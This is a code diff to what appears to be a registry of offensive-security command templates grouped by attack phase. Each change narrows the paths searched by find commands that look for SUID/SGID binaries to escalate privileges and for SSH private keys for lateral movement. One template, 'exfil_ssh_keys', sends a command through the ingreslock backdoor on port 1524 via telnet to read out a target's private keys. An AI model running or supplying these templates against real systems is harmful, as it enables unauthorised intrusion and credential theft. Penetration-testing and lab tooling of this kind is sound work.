@@ -916,7 +916,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="find_suid",
-    template="find / -perm -4000 -type f 2>/dev/null",
+    template="find /usr /bin /sbin -perm -4000 -type f 2>/dev/null",
     description="Find SUID binaries. Look for GTFOBins entries.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=[],
@@ -1845,7 +1845,7 @@ register(CommandTemplate(
 # --- Linux Privilege Escalation (expanded) ---
 register(CommandTemplate(
     name="find_suid",
-    template="find / -perm -4000 -type f 2>/dev/null",
+    template="find /usr /bin /sbin -perm -4000 -type f 2>/dev/null",
     description="Find SUID binaries that may allow privilege escalation.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=[],
@@ -1857,7 +1857,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="find_sgid",
-    template="find / -perm -2000 -type f 2>/dev/null",
+    template="find /usr /bin /sbin -perm -2000 -type f 2>/dev/null",
     description="Find SGID binaries for potential group-based privesc.",
     phase=AttackPhase.PRIVILEGE_ESCALATION,
     required_params=[],
@@ -2076,7 +2076,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="ssh_key_harvest",
-    template="find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
+    template="find /home /root /etc /opt -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
     description="Find SSH private keys for lateral movement.",
     phase=AttackPhase.POST_EXPLOITATION,
     required_params=[],
@@ -2588,7 +2588,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="exfil_ssh_keys",
-    template="{ echo 'find / -name id_rsa -o -name id_dsa 2>/dev/null | head -5 | xargs cat 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
+    template="{ echo 'find /home /root /etc -name id_rsa -o -name id_dsa 2>/dev/null | head -5 | xargs cat 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
     description="Find and exfiltrate SSH private keys via ingreslock.",
     phase=AttackPhase.EXFILTRATION,
     required_params=["target"],
